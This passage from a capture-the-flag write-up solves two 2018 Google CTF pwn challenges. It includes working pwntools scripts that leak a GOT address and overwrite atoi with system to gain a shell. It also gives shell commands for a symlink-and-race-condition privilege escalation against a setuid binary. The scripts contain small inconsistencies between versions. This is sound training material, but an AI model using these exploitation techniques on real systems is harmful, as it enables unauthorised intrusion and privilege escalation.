Darn, we can see that [PIE](https://en.wikipedia.org/wiki/Position-independent_code) or Position Independent Executable is enabled for this binary, this allows of the use of [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) or address space layout randomization which in turn is used to prevent attackers from knowing where existing executable code is. 

While this normally would cause headaches for certain exploits, we're fine! Reason why is because we have the ability to read and leak memory addresses. So we can write an exploit that will leak the current memory address and use that for further exploitation, allowing us to sort of avoid having to deal with ASLR.

Also take note of the following C line in the `store_todo` function.

```c
read_line(&todos[idx*TODO_LENGTH], TODO_LENGTH);
```

At the start of the application we define the TODO_LENGTH with the following line of code: `#define TODO_LENGTH 48`.

This means that we can only jump around in memory 48 bytes at a time, which isn't much and can be a problem. Let's see what memory addresses we can reach from our `store_todo` address.

```console
root@kali:~/Google-CTF/Fridge Todo List# python
Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> todo_addrs = 0x0203140
>>> for x in range(7):
...     hex(todo_addrs - 48 * x)
... 
'0x203140'
'0x203110'
'0x2030e0'
'0x2030b0'
'0x203080'
'0x203050'
'0x203020'
```

Taking the last memory address of `0x203020`, let's go back into IDA, press `G` and enter the address.

<p align="center"><a href="/images/gctf18-pwn2-16.png"><img src="/images/gctf18-pwn2-16.png"></a></p>

Press `OK` and we should then see what memory region we can access.

<p align="center"><a href="/images/gctf18-pwn2-17.png"><img src="/images/gctf18-pwn2-17.png"></a></p>

Awesome, so if we jump 288 (6*48) bytes back then we end up in the GOT where the [write](http://codewiki.wikidot.com/c:system-calls:write) function is stored.

Let's write a simply python exploit to leak that address and print it out for us.

```python
from pwn import *
import socket
import struct

s = remote('fridge-todo-list.ctfcompetition.com',1337)

s.send("admin\n")
s.send("2\n")
s.send("-6\n")
s.recvuntil("Your TODO: ")
leak = s.recvuntil("\n")[:-1]

while len(leak) < 8:
	leak += "\0"

leak = struct.unpack("<Q", leak[:8])[0]
print "Leaked Address: %x" % leak
```

Once we have our skeleton exploit ready, let's execute it.

```console
root@kali:~/Google-CTF/Fridge Todo List# python exploit.py 
[+] Opening connection to fridge-todo-list.ctfcompetition.com on port 1337: Done
Leaked Address: 55d0e28fb916
[*] Closed connection to fridge-todo-list.ctfcompetition.com port 1337
```

With this leaked address we see `916`. We need to look for where this address is located at. Since the `write` function in the GOT, let's check the PLT.

In IDA, press `CTRL+S` to bring up segments, and double click on the `.plt` segment.

<p align="center"><a href="/images/gctf18-pwn2-18.png"><img src="/images/gctf18-pwn2-18.png"></a></p>

Once you double click that segment you will be brought to the graph view. From there press `SPACE` to bring up the address view and find `916`.

<p align="center"><a href="/images/gctf18-pwn2-19.png"><img src="/images/gctf18-pwn2-19.png"></a></p>

Awesome so we are in fact in the PLT. With the address of `write` we can now calculate the entry address for the PLT by subtracting `916` from our leaked address. Once that's calculated we can then get the address of the other function calls like [system](https://www.tutorialspoint.com/c_standard_library/c_function_system.htm) by adding to the address.

So let's find the address for `system`. Let's go back into IDA and in the PLT table find `system`.

<p align="center"><a href="/images/gctf18-pwn2-20.png"><img src="/images/gctf18-pwn2-20.png"></a></p>

Double click that to follow the cross reference and we should get the address for `system` which should be `940`.

<p align="center"><a href="/images/gctf18-pwn2-21.png"><img src="/images/gctf18-pwn2-21.png"></a></p>

Great, now that we have that we can update our exploit code.

```python
from pwn import *
import socket
import struct

s = remote('fridge-todo-list.ctfcompetition.com',1337)

s.send("admin\n")
s.send("2\n")
s.send("-6\n")
s.recvuntil("Your TODO: ")
leak = s.recvuntil("\n")[:-1]

while len(leak) < 8:
	leak += "\0"

leak = (struct.unpack("<Q", leak[:8])[0]) - 0x916
print "Leaked Address: %x" % leak

system = leak - 0x940
```

We now need to find an address in the GOT that we want to replace. In this case I want to replace the [atoi](https://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm) function call since it will convert ascii to integer, which occurs in our application.

<p align="center"><a href="/images/gctf18-pwn2-22.png"><img src="/images/gctf18-pwn2-22.png"></a></p>

Looking at the location of `atoi` in the GOT PLT, we see that we need to overwrite past the `open` function. The `open` function is at memory address `203080` which should be `-4` from our python script when we calculated the memory offsets.

Once we know that, let's update our exploit code to leak the addresses we need, write over the `open` function and overwrite `atoi` with the `system` address.

This will allow us to enter anything we want in the application which should then be executed by `system`.

```python
from pwn import *
import socket
import struct

s = remote('fridge-todo-list.ctfcompetition.com',1337)

s.send("admin\n")
s.send("2\n")
s.send("-6\n")
s.recvuntil("Your TODO: ")
leak = s.recvuntil("\n")[:-1]

while len(leak) < 8:
	leak += "\0"

leak = (struct.unpack("<Q", leak[:8])[0]) - 0x916
print "Leaked Address: %x" % leak

system = leak + 0x940

s.send("3\n")
s.send("-4\n")
s.send("AAAAAAAA" + struct.pack("<Q", system) + "\n")
s.interactive()
```

Once we have the exploit updated, let's execute it and see if it works.

```console
root@kali:~/Google-CTF/Fridge Todo List# python exploit.py 
[+] Opening connection to fridge-todo-list.ctfcompetition.com on port 1337: Done
Leaked Address: 560f722a7000
[*] Switching to interactive mode

Hi admin, what would you like to do?
1) Print TODO list
2) Print TODO entry
3) Store TODO entry
4) Delete TODO entry
5) Remote administration
6) Exit
> 
In which slot would you like to store the new entry? What's your TODO? 
Hi admin, what would you like to do?
1) Print TODO list
2) Print TODO entry
3) Store TODO entry
4) Delete TODO entry
5) Remote administration
6) Exit
> $ ls -la
total 52
drwxr-xr-x 3 user   user     4096 Oct 24 19:04 .
drwxr-xr-x 4 nobody nogroup  4096 Oct 24 19:04 ..
-rw-r--r-- 1 user   user      220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 user   user     3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 user   user      655 May 16  2017 .profile
-r-sr-xr-x 1 admin  user     9000 Sep 26 15:44 holey_beep
-r-xr-xr-x 1 user   nogroup 18224 Sep 26 15:44 todo
drwxrwxrwt 2 user   user       80 Mar  1 00:49 todos
```

Awesome, it works! So instead of converting our input to an integer, we get `system` to execute our commands!

Let's find the flag!

```console
> $ ls -la todos
total 12
drwxrwxrwt 2 user user   80 Mar  1 00:51 .
drwxr-xr-x 3 user user 4096 Oct 24 19:04 ..
-rw-r--r-- 1 user user 6144 Mar  1 00:51 CountZero
-rw------- 1 user user    0 Mar  1 00:51 admin
> $ cat todos/CountZero
Watch Hackers (again)Figure out why the fridge keeps beepingcheck check /home/user/holey_beepdebug the fridge - toilet connectivityfollow sec advice: CTF{goo.gl/cjHknW}/4513753
```

And there we have it folks, the flag!

__FLAG:__ CTF{goo.gl/cjHknW}

## Holey Beep

<p align="center"><a href="/images/gctf18-pwn2-23.png"><img src="/images/gctf18-pwn2-23.png"></a></p>

Upon reading the challenge description we learn that with the previous exploit we see the secret cake recipe file at the root directory of the system. We also learn that the alarm on the fridge keeps sounding all the time and seems to be the sign of the [Holey Beep](https://holeybeep.ninja/) vulnerability (yes... that's a real vulnerability!). We need to find a way to get a root shell to read the file.

Alright, knowing that let's download the attachment and extract all the files. We should be presented with the following binary.

```console
root@kali:~/Google-CTF/Holy Beep# ls
holey_beep
root@kali:~/Google-CTF/Holy Beep# file holey_beep 
holey_beep: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6fe5703ed40e673f85df5a7332b9ad3d94a17c99, not stripped
```

If we look back into our previous challenge, once we got code execution we also see that the `holey_beep` binary is present there as well.

```console
> $ ls -la
total 52
drwxr-xr-x 3 user   user     4096 Oct 24 19:04 .
drwxr-xr-x 4 nobody nogroup  4096 Oct 24 19:04 ..
-rw-r--r-- 1 user   user      220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 user   user     3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 user   user      655 May 16  2017 .profile
-r-sr-xr-x 1 admin  user     9000 Sep 26 15:44 holey_beep
-r-xr-xr-x 1 user   nogroup 18224 Sep 26 15:44 todo
drwxrwxrwt 2 user   user       80 Mar  1 00:49 todos
```

Fortunately for us this challenge gave us a big hint by providing info on the Holey Beep vulnerability which allowed for privilege escalation via a race condition in the [beep](https://linux.die.net/man/1/beep) binary file. There's a very good blog called "[HoleyBeep: Explanations and exploit](https://sigint.sh/#/holeybeep)" that details the vulnerability and exploitation process that I highly suggest you read.

But before we go off track, let's open the binary in IDA and see what the binary really does.

<p align="center"><a href="/images/gctf18-pwn2-24.png"><img src="/images/gctf18-pwn2-24.png"></a></p>

So as detailed in the image, the application installs a signal 15, (hence `0F` in hex) via the [signal](https://www.tutorialspoint.com/cplusplus/cpp_signal_handling.htm) function. This signal checks for the [SIGTERM](https://stackoverflow.com/questions/16723626/what-is-signal-15-received) signal form the application. The application then goes to check if we have more than 1 argument. If we don't it prints out a usage for us, otherwise it jumps to `loc_A21` which seems to be configuring a `FOR` loop.

The C code for this part of the application will look like the following:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
	const char **v1;
	v1 = argv;
	if (signal(15, handle_sigterm) == (__sighandler_t)-1LL)
		err(1, "signal", argv);
	if (argc <= 1)
		errx(1, "usage: holey_beep period1 [period2] [period3] [...]", argv);
	for (i = 1; i < ?; ++i)
	{
	}
	return 0;
}
```

Let's look deeper into the application to see what else is going on.

<p align="center"><a href="/images/gctf18-pwn2-25.png"><img src="/images/gctf18-pwn2-25.png"></a></p>

So it seems the `FOR` loop is using our argument counter, and for each argument it sets up a new variable called `device` which attempts to open `dev/console` via the [open](http://codewiki.wikidot.com/c:system-calls:open) function. So this seems to be a bug since isn't this supposed to be `/dev/console`?

After that it checks to make sure that the device integer is less than 0, if it is, it prints an error.

So knowing that, the updated C code for this should look like so.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
	const char **v1;
	v1 = argv;
	if (signal(15, handle_sigterm) == (__sighandler_t)-1LL)
		err(1, "signal", argv);
	if (argc <= 1)
		errx(1, "usage: holey_beep period1 [period2] [period3] [...]", argv);
	for (i = 1; i < argc; ++i)
	{
		device = open("dev/console", 0, v1);
		if ((signed int)device < 0)
			err(1, "open(\"dev/console\", O_RDONLY)");
	}
	return 0;
}
```

Let's continue exploring the application.

<p align="center"><a href="/images/gctf18-pwn2-26.png"><img src="/images/gctf18-pwn2-26.png"></a></p>

Here we see that after the `open` function is called and is successful, [atoi](https://www.tutorialspoint.com/c_standard_library/c_function_atoi.htm) is called against the `argv` parameter and sets the output to a new variable.

Then it check is the [ioctl](https://stackoverflow.com/questions/15807846/ioctl-linux-device-driver) or input-output control is less than 0, if so it prints an error via [fprint](https://www.tutorialspoint.com/c_standard_library/c_function_fprintf.htm). If not it closes the device via the [close](http://codewiki.wikidot.com/c:system-calls:close) function.  

So the full C code for this application should be as follows.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
	const char **v1;
	v1 = argv;
	if (signal(15, handle_sigterm) == (__sighandler_t)-1LL)
		err(1, "signal", argv);
	if (argc <= 1)
		errx(1, "usage: holey_beep period1 [period2] [period3] [...]", argv);
	for (i = 1; i < argc; ++i)
	{
		device = open("dev/console", 0, v1);
		if ((signed int)device < 0)
			err(1, "open(\"dev/console\", O_RDONLY)");
		v2 = atoi(v1[i]);
		if (ioctl(device, 0x4B2FuLLm, v2) < 0)
			fprintf(stderr, "ioctl(%d, KIOCSOUND, %d) failed." (unsigned int)device, v2);
		close(device);
	}
	return 0;
}
```

Alright, so we got most of the code, but we are still missing part of it. We still don't know what the `handle_sigterm` function is doing. So let's dig into that by double clicking it.

<p align="center"><a href="/images/gctf18-pwn2-27.png"><img src="/images/gctf18-pwn2-27.png"></a></p>

So we can see that this function checks to see if the device is less than or equal to 0, and if the `ioctl` of the device us less then 0. If so it prints out debug data that seems to be of 1023 bytes or `3FF` in hex which is passed to the buffer via the [read](http://codewiki.wikidot.com/c:system-calls:read) function.

The code for this function can be seen as such.

```c
void __noreturn handle_sigterm()
{
	char buf;
	if ((signed int)device >= 0 && ioctl(device, 0x4B2FuLL, 0LL) < 0 )
	{
		fprintf(stderr, "ioctl(%d, KIOCSOUND, 0) failed.", (unsigned int)device);
		memset(&buf, 0, 0x400uLL);
		read(device, &buf, 0x3FFuLL);
		fprintf(stderr, "debug_data: \"%s\"", &buf);
	}
	exit(0);
}
```

Awesome, so we know how this whole application functions! We also know what there is an bug with the `open` function when it tries to open `dev/console`, which means we can possibly create a file such as `/tmp/dev/console` and launch the binary from `tmp` then it will launch the console from our directory. This `console` file can then be a symbolic link to our flag!

Once that's done we then need to somehow figure out a way to send a [SIGTERM](https://www.gnu.org/software/libc/manual/html_node/Termination-Signals.html) signal (`kill -15`) so that it actually reads the flag and outputs the contents.

So for this signal to be sent in the proper location we can utilize a possible race condition exploit in this application. Since the application takes in arguments via `for (i = 1; i < argc; ++i)` then we can try and send multiple arguments to make the loop slow, and then attempt to send the kill signal. 

For this race condition we can use the [seq](https://ss64.com/bash/seq.html) function to send multiple arguments from 1 to oh I don't know, like 5000. We can also cause this to be way slower by abusing the `fprintf` function. 

Notice how the `fprintf` function only outputs to [stderr](https://www.computerhope.com/jargon/s/stderr.htm). So what we can do is redirect this standedr output of errors to a named pipe such as [mkfifo](https://linux.die.net/man/3/mkfifo), then as soon as the kernel buffer for that pipe fills up, it will stop and freeze until it's read from the other side. And as long as we don't read from the other side, we then allow ourselves to abuse this race condition to send the kill signal.

So with that knowledge, let's use our previous exploit to get a shell, and navigate to the `/tmp` folder.

```console
> $ sh
$ cd /tmp
```

From there let's make a new directory called `dev`. Once the folder is created let's make a new symbolic link to from the `secret_cake_recipe` file to `/tmp/dev/console` - since remember, we want to abuse `dev/console` that's hard coded.

Then let's make a new named pipe called `fake` in the `tmp` folder which will be used for our race condition.

```console
$ mkdir dev
$ ln -s /secret_cake_recipe /tmp/dev/console
$ mkfifo /tmp/fake
$ ls -la
total 4
drwxrwxrwt  3 user user   80 Mar  1 01:12 .
drwxr-xr-x 22 user user 4096 Oct 24 19:10 ..
drwxr-xr-x  2 user user   60 Mar  1 01:12 dev
prw-r--r--  1 user user    0 Mar  1 01:12 fake
$ ls -la dev
total 0
drwxr-xr-x 2 user user 60 Mar  1 01:12 .
drwxrwxrwt 3 user user 80 Mar  1 01:12 ..
lrwxrwxrwx 1 user user 19 Mar  1 01:12 console -> /secret_cake_recipe
```

Once we have all that set up, we can now exploit the race condition.

We will start by calling the `holey_beep` binary, provide it a lot of arguments via the `seq` function, redirect the standard error to our named pipe, and finally allow all that to run in the background via the `&` parameter since we need to get the binary's [pid](http://www.linfo.org/pid.html) so we can send our signal.

```console
$ /home/user/holey_beep $(seq 1 1 5000) 2> /tmp/fake &
```

Once that's called, we will then want to call a [sleep](http://man7.org/linux/man-pages/man3/sleep.3.html) function that will wait some time, and then once that time is over, we will read the standard input of the named pipe. 

The reason we do this is because our flag will be somewhere in that buffer since `handle_sigterm` writes the debug data to stander error as well. Once we send the kill function it should trigger the symbolic link and read the flag which should be sent to our named pipe and then printed out on our side.

We will run this sleep function again in the background so we can get the `pid` of the `holey_beep` file. To do that we will use the [pgrep](https://linux.die.net/man/1/pgrep) function.

Alright, with that let's go ahead and execute the following sleep function, get the process id of the binary, and then send the kill signal. 

```console
$ ( sleep 30; cat - ) < /tmp/fake &
$ pgrep holey_beep
13
$ kill -15 13
```

Once completed wait a few seconds and you should then get output on your screen from the named pipe.

```console
---trim---
4, KIOCSOUND, 2016) failed.ioctl(4, KIOCSOUND, 2017) failed.ioctl(4, KIOCSOUND, 2018) failed.ioctl(4, KIOCSOUND, 0) failed.debug_data: "== Secret recipe for the CTF{the_cake_wasnt_a_lie} cake ==

The Pittsburgh Engineer’s Cake (This is the maximum of the final Gaussian Process model, trained
on all the Pittsburgh Trials, including transfer learning.)

    Mix together flour, baking soda, and cayenne pepper. Then, mix the sugar, egg, butter (near refrigerator
temperature), and other ingredients until nearly smooth; it takes about 2 minutes in a counter-top stand mixer
with a flat paddle blade. Add the dry ingredients and mix just until the dough is uniform; do not over-mix. Spoon
out onto parchment paper (we used a #40 scoop, 24 milliliters), and bake for 14 minutes at 175C (350◦
F).

• 167 grams of all-purpose flour.
• 186 grams of dark chocolate chips.
• 1/2 tsp. baking soda.
• 1/4 tsp. salt.
• 1/4 tsp. cayenne pepper.
• 262 grams of sugar (75% medium brown, 25% white).
• 30 grams of egg.
• 132 grams of butter.
• 3/8 tsp. orange extract.
• 1/2 tsp. vanilla extract.

https://research.google.com/pubs/archive/46507.pdf
```

And just like that, we exploited the race condition and got our flag!

__FLAG:__ CTF{the_cake_wasnt_a_lie}

## Closing

And there we have it ladies and gentleman, we completed the 2018 Google CTF: Beginners Quest!

I've got to say, that the final PWN challenges were actually very challenging, even for me! It just really goes to show you how many crazy vulnerabilities are out there in the wild and what it takes to find and exploit them.

This CTF was a great learning experience and I hope that it allowed you all to learn something new as well.

With that, I close this series of posts!

Thanks for reading!
